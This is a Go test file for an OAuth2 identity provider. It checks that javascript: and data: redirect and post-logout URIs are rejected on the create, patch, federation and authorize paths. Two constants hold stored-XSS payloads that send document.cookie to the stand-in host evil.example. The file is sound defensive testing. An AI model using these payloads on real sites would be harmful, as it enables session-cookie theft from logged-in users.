package oauth2server_test

// redirectURISchemeReason (plugins/oauth2server/dcr.go) is the guard that keeps
// a `javascript:` / `data:` / `vbscript:` pseudo-scheme out of a client's
// redirect_uris. Its own doc comment names the sink precisely: a consent UI
// performs the equivalent of `window.location = redirect_url`, so a stored
// pseudo-scheme executes script in the IdP's own origin under the logged-in
// user's session. yauth's reference IdP does exactly that assignment
// (examples/sso/idp/web.go).
//
// The guard has exactly ONE caller — the dynamic-registration loop at dcr.go:149.
// Every other path that writes a redirect target skips it:
//
//   - POST /oauth2/clients (handleCreateClient, client_admin.go) runs only
//     sanitizeURL + normalizeLaunchMetadata, and normalizeLaunchMetadata
//     validates initiate_login_uri / client_uri / logo_uri — never redirect_uris.
//   - post_logout_redirect_uris are unvalidated on BOTH the create and the patch
//     path, and handleEndSession 302s the browser to whatever is stored there.
//   - POST /federate/approve stores ts.RedirectURIs straight off a remote RP's
//     signed federation request, while validating that request's return_uri and
//     initiate_login_uri.
//
// And because redirectURIAllowed / uriRegistered are exact-string equality, a row
// written before the guard existed (or through any of the doors above) stays a
// usable target at /oauth/authorize and /oauth/end_session forever — there is no
// read-side check to stop it.
//
// Every refusal below is paired with a POSITIVE CONTROL registering and using the
// three shapes that must keep working: https://, a native-app custom scheme
// (myapp://cb) and RFC 8252 loopback http (http://127.0.0.1:1234/cb).

import (
	"context"
	"encoding/json"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"

	"github.com/yackey-labs/yauth/domain"
)

// jsRedirect is the XSS payload shape: assigning it to window.location runs
// script in the assigning document's origin.
const jsRedirect = "javascript:fetch('https://evil.example/'+document.cookie)"

// dataPostLogout is the same sink reached through handleEndSession's 302.
const dataPostLogout = "data:text/html,<script>fetch('https://evil.example/'+document.cookie)</script>"

// adminPatch sends an admin-authenticated PATCH with a JSON body.
func (h *harness) adminPatch(t *testing.T, path, adminCookie, body string) (int, map[string]any) {
	t.Helper()
	req, _ := http.NewRequest(http.MethodPatch, h.srv.URL+path, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.AddCookie(&http.Cookie{Name: "yauth_session", Value: adminCookie})
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("patch %s: %v", path, err)
	}
	defer res.Body.Close() //nolint:errcheck
	var out map[string]any
	_ = json.NewDecoder(res.Body).Decode(&out)
	return res.StatusCode, out
}

// storedClientID digs the created client's client_id out of a
// POST /oauth2/clients response body, or "" when the body has none.
func storedClientID(body map[string]any) string {
	c, _ := body["client"].(map[string]any)
	id, _ := c["client_id"].(string)
	return id
}

// TestCreateClient_RejectsJavascriptRedirectURI: the admin create endpoint must
// apply the same scheme policy DCR applies, and must not persist the row when it
// refuses.
func TestCreateClient_RejectsJavascriptRedirectURI(t *testing.T) {
	h := newHarness(t)
	_, adminCookie := h.seedUser(t, "admin@idp.test", "admin")

	// POSITIVE CONTROL — the three legitimate shapes still register.
	for _, uri := range []string{"https://app.example/cb", "myapp://cb", "http://127.0.0.1:1234/cb"} {
		body, _ := json.Marshal(map[string]any{
			"name": "ok", "redirect_uris": []string{uri},
			"grant_types": []string{"authorization_code"}, "scopes": []string{"openid"},
			"is_public": false, "token_endpoint_auth_method": "client_secret_post",
		})
		st, out := h.adminPost(t, "/api/auth/oauth2/clients", adminCookie, string(body))
		if st != http.StatusCreated {
			t.Fatalf("legitimate redirect_uri %q must still register: status=%d body=%v", uri, st, out)
		}
	}

	// THE DEFECT — a pseudo-scheme redirect target is accepted and stored.
	bad, _ := json.Marshal(map[string]any{
		"name": "xss", "redirect_uris": []string{jsRedirect},
		"grant_types": []string{"authorization_code"}, "scopes": []string{"openid"},
		"is_public": true,
	})
	st, out := h.adminPost(t, "/api/auth/oauth2/clients", adminCookie, string(bad))
	if cid := storedClientID(out); cid != "" {
		stored, err := h.repo.GetOAuth2ClientByClientID(context.Background(), cid)
		if err != nil {
			t.Fatalf("lookup created client: %v", err)
		}
		t.Fatalf("POST /oauth2/clients persisted a javascript: redirect_uri (status=%d, client_id=%s, redirect_uris=%s)",
			st, cid, string(stored.RedirectURIs))
	}
	if st != http.StatusBadRequest {
		t.Fatalf("expected 400 for a javascript: redirect_uri, got status=%d body=%v", st, out)
	}
}

// TestCreateClient_RejectsDataPostLogoutURI: post_logout_redirect_uris feed
// handleEndSession's 302, so they need the same policy.
func TestCreateClient_RejectsDataPostLogoutURI(t *testing.T) {
	h := newHarness(t)
	_, adminCookie := h.seedUser(t, "admin@idp.test", "admin")

	// POSITIVE CONTROL — an https post-logout URI still registers.
	okBody, _ := json.Marshal(map[string]any{
		"name": "ok", "redirect_uris": []string{"https://app.example/cb"},
		"grant_types": []string{"authorization_code"}, "scopes": []string{"openid"},
		"is_public": false, "token_endpoint_auth_method": "client_secret_post",
		"post_logout_redirect_uris": []string{"https://app.example/bye"},
	})
	if st, out := h.adminPost(t, "/api/auth/oauth2/clients", adminCookie, string(okBody)); st != http.StatusCreated {
		t.Fatalf("https post_logout_redirect_uri must still register: status=%d body=%v", st, out)
	}

	// THE DEFECT — data: post-logout target accepted and stored.
	bad, _ := json.Marshal(map[string]any{
		"name": "xss", "redirect_uris": []string{"https://app.example/cb"},
		"grant_types": []string{"authorization_code"}, "scopes": []string{"openid"},
		"is_public": false, "token_endpoint_auth_method": "client_secret_post",
		"post_logout_redirect_uris": []string{dataPostLogout},
	})
	st, out := h.adminPost(t, "/api/auth/oauth2/clients", adminCookie, string(bad))
	if cid := storedClientID(out); cid != "" {
		stored, err := h.repo.GetOAuth2ClientByClientID(context.Background(), cid)
		if err != nil {
			t.Fatalf("lookup created client: %v", err)
		}
		t.Fatalf("POST /oauth2/clients persisted a data: post_logout_redirect_uri (status=%d, stored=%s)",
			st, string(stored.PostLogoutRedirectURIs))
	}
	if st != http.StatusBadRequest {
		t.Fatalf("expected 400 for a data: post_logout_redirect_uri, got status=%d body=%v", st, out)
	}
}

// TestPatchClient_RejectsDataPostLogoutURI: PATCH is the second door onto the
// same column. (patchClientRequest has no redirect_uris field, so PATCH cannot
// rewrite those — post_logout is the whole exposure here.)
func TestPatchClient_RejectsDataPostLogoutURI(t *testing.T) {
	h := newHarness(t)
	_, adminCookie := h.seedUser(t, "admin@idp.test", "admin")
	clientID, _, _ := h.createClient(t, adminCookie,
		`{"name":"c","redirect_uris":["https://app.example/cb"],"grant_types":["authorization_code"],"scopes":["openid"],"is_public":false,"token_endpoint_auth_method":"client_secret_post"}`)

	// POSITIVE CONTROL — an https post-logout URI still patches through.
	st, out := h.adminPatch(t, "/api/auth/oauth2/clients/"+clientID, adminCookie,
		`{"post_logout_redirect_uris":["https://app.example/bye"]}`)
	if st != http.StatusOK {
		t.Fatalf("https post_logout_redirect_uri must still patch: status=%d body=%v", st, out)
	}

	// THE DEFECT.
	st, out = h.adminPatch(t, "/api/auth/oauth2/clients/"+clientID, adminCookie,
		`{"post_logout_redirect_uris":["`+dataPostLogout+`"]}`)
	stored, err := h.repo.GetOAuth2ClientByClientID(context.Background(), clientID)
	if err != nil {
		t.Fatalf("lookup client: %v", err)
	}
	if strings.Contains(string(stored.PostLogoutRedirectURIs), "data:") {
		t.Fatalf("PATCH persisted a data: post_logout_redirect_uri (status=%d, stored=%s)", st, string(stored.PostLogoutRedirectURIs))
	}
	if st != http.StatusBadRequest {
		t.Fatalf("expected 400 for a data: post_logout_redirect_uri on PATCH, got status=%d body=%v", st, out)
	}
}

// tryAuthorizeAndConsent runs GET /oauth/authorize → POST /oauth2/consent and
// reports the redirect_url the consent SPA would assign to window.location.
// Unlike harness.authorizeAndConsent it tolerates a refusal at either leg, which
// is exactly what this test is measuring.
func tryAuthorizeAndConsent(t *testing.T, h *harness, cookie, clientID, redirectURI, scope, challenge string) (redirectURL string, ok bool) {
	t.Helper()
	q := url.Values{}
	q.Set("response_type", "code")
	q.Set("client_id", clientID)
	q.Set("redirect_uri", redirectURI)
	q.Set("scope", scope)
	q.Set("state", "s")
	q.Set("code_challenge", challenge)
	q.Set("code_challenge_method", "S256")

	req, _ := http.NewRequest(http.MethodGet, h.srv.URL+"/api/auth/oauth/authorize?"+q.Encode(), nil)
	req.AddCookie(&http.Cookie{Name: "yauth_session", Value: cookie})
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("authorize: %v", err)
	}
	defer res.Body.Close() //nolint:errcheck
	var p struct {
		CSRFToken   string `json:"csrf_token"`
		RequestID   string `json:"request_id"`
		RedirectURL string `json:"redirect_url"`
		Error       string `json:"error"`
	}
	_ = json.NewDecoder(res.Body).Decode(&p)
	if p.RedirectURL != "" {
		return p.RedirectURL, true
	}
	if p.RequestID == "" {
		return "", false
	}

	body, _ := json.Marshal(map[string]any{"request_id": p.RequestID, "csrf_token": p.CSRFToken, "approved": true})
	creq, _ := http.NewRequest(http.MethodPost, h.srv.URL+"/api/auth/oauth2/consent", strings.NewReader(string(body)))
	creq.Header.Set("Content-Type", "application/json")
	creq.AddCookie(&http.Cookie{Name: "yauth_session", Value: cookie})
	cres, err := http.DefaultClient.Do(creq)
	if err != nil {
		t.Fatalf("consent: %v", err)
	}
	defer cres.Body.Close() //nolint:errcheck
	var rd struct {
		RedirectURL string `json:"redirect_url"`
	}
	_ = json.NewDecoder(cres.Body).Decode(&rd)
	if rd.RedirectURL == "" {
		return "", false
	}
	return rd.RedirectURL, true
}

// seedClientRow writes an OAuth2 client straight through the repo, simulating a
// row registered BEFORE the scheme policy existed — the population the write-path
// guards alone cannot reach.
func seedClientRow(t *testing.T, h *harness, redirectURIs []string) string {
	t.Helper()
	clientID := "legacy-" + uuid.NewString()[:8]
	name := "legacy"
	method := "none"
	ru, _ := json.Marshal(redirectURIs)
	gt, _ := json.Marshal([]string{"authorization_code"})
	sc, _ := json.Marshal([]string{"openid"})
	if err := h.repo.CreateOAuth2Client(context.Background(), domain.NewOAuth2Client{
		ID:                      uuid.NewString(),
		ClientID:                clientID,
		RedirectURIs:            ru,
		ClientName:              &name,
		GrantTypes:              gt,
		Scopes:                  sc,
		IsPublic:                true,
		TokenEndpointAuthMethod: &method,
		CreatedAt:               time.Now().UTC(),
	}); err != nil {
		t.Fatalf("seed client row: %v", err)
	}
	return clientID
}

// TestAuthorize_RefusesStoredDangerousRedirectURI is the retroactive half: rows
// that already carry a pseudo-scheme must stop being usable targets without a
// migration or a sweep.
func TestAuthorize_RefusesStoredDangerousRedirectURI(t *testing.T) {
	h := newHarness(t)
	_, userCookie := h.seedUser(t, "alice@idp.test", "user")
	verifier := "this-is-a-43-character-pkce-verifier-string-x"
	challenge := pkceS256(verifier)

	// POSITIVE CONTROL — a legitimately-registered row still authorizes.
	good := seedClientRow(t, h, []string{"https://app.example/cb"})
	if url, ok := tryAuthorizeAndConsent(t, h, userCookie, good, "https://app.example/cb", "openid", challenge); !ok {
		t.Fatalf("a legitimate https redirect_uri must still authorize (got %q)", url)
	} else if !strings.HasPrefix(url, "https://app.example/cb?") {
		t.Fatalf("unexpected redirect_url for the control client: %q", url)
	}

	// THE DEFECT — the pre-existing javascript: row is honoured, and the
	// authorization code is handed to the SPA inside a script URL.
	bad := seedClientRow(t, h, []string{jsRedirect})
	redirectURL, ok := tryAuthorizeAndConsent(t, h, userCookie, bad, jsRedirect, "openid", challenge)
	if ok {
		t.Fatalf("/oauth/authorize accepted a stored javascript: redirect_uri and returned redirect_url=%q", redirectURL)
	}
}

// TestFederateApprove_RejectsJavascriptRedirectURI: the guided-federation approve
// endpoint stores a remote RP's redirect_uris verbatim. The admin's click is a
// trust decision about the PEER, not a waiver of the scheme policy.
func TestFederateApprove_RejectsJavascriptRedirectURI(t *testing.T) {
	peer := newPeerIssuer(t)
	op, adminKey := opServerWithAdmin(t)

	// POSITIVE CONTROL — an https redirect_uri still federates.
	okJWT := peer.signFederationRequest(t, peer.srv.URL, "https://app.test/return", []string{"https://app.test/cb"})
	if code, out := postFed(t, op, "/api/auth/federate/approve", adminKey, `{"federation_request":"`+okJWT+`"}`); code != http.StatusOK {
		t.Fatalf("an https redirect_uri must still federate: status=%d out=%v", code, out)
	}

	// THE DEFECT.
	badJWT := peer.signFederationRequest(t, peer.srv.URL, "https://app.test/return", []string{jsRedirect})
	code, out := postFed(t, op, "/api/auth/federate/approve", adminKey, `{"federation_request":"`+badJWT+`"}`)
	if code == http.StatusOK {
		t.Fatalf("/federate/approve registered a client with a javascript: redirect_uri: status=%d out=%v", code, out)
	}
}
